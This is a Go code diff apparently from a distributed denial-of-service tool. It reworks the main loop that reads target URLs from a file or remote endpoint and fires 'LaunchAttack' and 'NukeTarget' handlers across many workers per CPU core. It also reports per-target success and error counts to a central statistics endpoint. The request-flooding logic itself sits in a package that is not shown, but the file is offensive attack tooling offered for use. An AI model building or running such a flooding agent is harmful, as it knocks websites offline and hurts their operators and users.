@@ -2,9 +2,7 @@ package main
 
 import (
 	"context"
-	"encoding/json"
 	"flag"
-	"fmt"
 	"log"
 	"os"
 	"os/signal"
@@ -15,9 +13,11 @@ import (
 	logw "github.com/andriiyaremenko/logwriter"
 	"github.com/andriiyaremenko/logwriter/color"
 	"github.com/andriiyaremenko/mg/client"
+	"github.com/andriiyaremenko/mg/dto"
 	"github.com/andriiyaremenko/mg/handler"
 	"github.com/andriiyaremenko/mg/source"
-	"github.com/andriiyaremenko/tinycqs/command"
+	"github.com/andriiyaremenko/mg/statistic"
+	"github.com/andriiyaremenko/pipelines"
 	"github.com/google/uuid"
 )
 
@@ -42,34 +42,33 @@ func main() {
 		log.Lmsgprefix,
 	)
 
+	log.Printf("log verbosity level is %d", *q)
+
 	numWorkers := *workersPerCore * runtime.NumCPU()
+	httpClient := client.New(time.Second * 10)
 
 	var targetSource source.Source
 	switch *t {
 	case "file":
 		targetSource = source.GetFromFile(*s)
-		log.Printf("reading from file %s", *s)
+		log.Printf("reading from file %s", color.ColorizeText(color.ANSIColorBlue, *s))
 	case "endpoint":
-		targetSource = source.GetFromEndpoint(client.New(), *s)
-		log.Printf("reading from endpoint %s", *s)
+		targetSource = source.GetFromEndpoint(httpClient, *s)
+		log.Printf("reading from endpoint %s", color.ColorizeText(color.ANSIColorBlue, *s))
 	default:
-		log.Fatalln(logw.Error.WithMessage("source type %s is unsupported", *t))
+		log.Fatalln(logw.Error.WithMessage("source type %s is unsupported", t))
 	}
 
-	comm, err := command.NewWithConcurrencyLimit(
-		numWorkers,
-		handler.LaunchAttack(numWorkers),
-		handler.NukeTarget(*amountRequests, agentUID),
-		handler.TargetDown(log),
-		handler.TargetAlive(log),
-		handler.TargetError(log),
-		handler.HandleErrors(log),
-		handler.CollectStatistic(ctx, log, *statEndpoint),
+	agent := statistic.StartCollection(ctx, httpClient, log, *statEndpoint)
+
+	p1 := pipelines.New(handler.LaunchAttack(numWorkers))
+	p2 := pipelines.Append(p1, handler.NukeTarget(log, agentUID, numWorkers, *amountRequests))
+	pipeline := pipelines.Append[dto.Target, dto.TargetResponse, dto.Statistic](
+		p2, pipelines.WithErrorHandler(
+			handler.ProcessTargetResponse(log, numWorkers),
+			handler.HandleTargetError(numWorkers),
+		),
 	)
-
-	if err != nil {
-		log.Fatalln(logw.Error, err)
-	}
 
 	c := make(chan os.Signal, 1)
 
@@ -79,79 +78,61 @@ func main() {
 		<-c
 
 		cancel()
+		<-agent.Done()
 
 		log.Println("shutting down...")
 		os.Exit(1)
 	}()
 
-	callBack := func(w command.CommandsWorker, e command.Event) {
-		log.Println(logw.Level(0), string(e.Payload()))
-
-	readSource:
+loop:
+	for target, keep, err := targetSource(); keep; target, keep, err = targetSource() {
 		select {
 		case <-ctx.Done():
-			return
+			break loop
 		default:
 		}
-
-		target, keep, err := targetSource()
 
 		if err != nil {
 			log.Println(logw.Error, err)
 			time.Sleep(time.Second * 5)
 
-			goto readSource
-		}
-
-		b, err := json.Marshal(target)
-		if err != nil {
-			log.Println(logw.Error, err)
-
-			goto readSource
+			continue loop
 		}
 
 		if !keep {
-			return
+			break loop
 		}
 
-		log.Println(color.ColorizeText(color.ANSIColorGreen, fmt.Sprintf("launching an attack against %s", target.URL)))
-		err = w.Handle(command.E{
-			Type: "LAUNCH_ATTACK",
-			P:    b,
-		})
-		if err != nil {
+		log.Println(
+			logw.Info.WithString("target", target.URL),
+			color.ColorizeText(color.ANSIColorGreen, "launching an attack"))
+
+		logErr := func(err error) {
 			log.Println(logw.Error, err)
 		}
+		collectTargetStat := func(aggr *dto.TargetStatistic, next dto.Statistic) *dto.TargetStatistic {
+			aggr.Error += next.Error
+			aggr.Success += next.Success
+			return aggr
+		}
+		stat, _ := pipelines.Reduce(
+			pipeline.Handle(ctx, pipelines.Event[dto.Target]{Payload: *target}),
+			pipelines.SkipErrors(collectTargetStat, logErr),
+			&dto.TargetStatistic{
+				Statistic: dto.Statistic{
+					Success: 0,
+					Error:   0,
+				},
+				AgentUID: agentUID,
+				TargetID: target.ID,
+			},
+		)
+
+		agent.AddStatistic(*stat)
+
+		log.Println(
+			logw.Info.WithString("target", target.URL),
+			color.ColorizeText(color.ANSIColorGreen, "attack completed"),
+		)
 	}
-
-	w := command.NewWorker(ctx, callBack, comm, 1)
-
-readSource:
-	target, _, err := targetSource()
-
-	if err != nil {
-		log.Println(logw.Error, err)
-		time.Sleep(time.Second * 5)
-
-		goto readSource
-	}
-
-	b, err := json.Marshal(target)
-	if err != nil {
-		log.Println(logw.Error, err)
-
-		goto readSource
-	}
-
-	log.Println(color.ColorizeText(color.ANSIColorGreen, fmt.Sprintf("launching an attack against %s", target.URL)))
-	err = w.Handle(command.E{
-		Type: "LAUNCH_ATTACK",
-		P:    b,
-	})
-
-	if err != nil {
-		log.Println(logw.Error, err)
-	}
-
-	<-c
 }
